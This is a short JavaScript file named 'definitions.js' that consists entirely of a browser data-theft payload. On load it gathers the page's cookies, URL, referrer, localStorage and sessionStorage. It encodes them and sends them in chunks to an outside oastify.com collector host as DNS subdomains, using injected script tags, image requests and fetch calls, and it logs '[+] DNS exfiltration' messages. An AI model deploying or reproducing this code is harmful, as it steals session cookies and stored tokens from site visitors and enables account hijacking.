// definitions.js
(function() {
    'use strict';
    
    function exfilViaDNS(data) {
        try {
            var encoded = btoa(JSON.stringify(data))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=/g, '');
            
            var chunks = encoded.match(/.{1,50}/g) || [];
            
            chunks.forEach(function(chunk, index) {
                var subdomain = chunk + '.' + index + '.705vz1oy49w1zgorhn97b1nl2c83wwkl.oastify.com';
                
                var script = document.createElement('script');
                script.src = 'http://' + subdomain + '/x.js';
                document.head.appendChild(script);
                
                var img = new Image();
                img.src = 'http://' + subdomain + '/x.gif';
                
                fetch('http://' + subdomain + '/x').catch(function(){});
                
                setTimeout(function() {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                }, 2000);
            });
            
            console.log('[+] DNS exfiltration: ' + chunks.length + ' chunks');
        } catch(e) {
            console.error('[!] DNS exfil failed:', e);
        }
    }
    
    // Collect data
    var payload = {
        c: document.cookie,
        u: location.href,
        r: document.referrer,
        t: Date.now()
    };
    
    try {
        payload.ls = JSON.stringify(localStorage);
        payload.ss = JSON.stringify(sessionStorage);
    } catch(e) {}
    
    // Exfiltrate
    exfilViaDNS(payload);
    
    console.log('[*] DNS exfiltration initiated');
})();
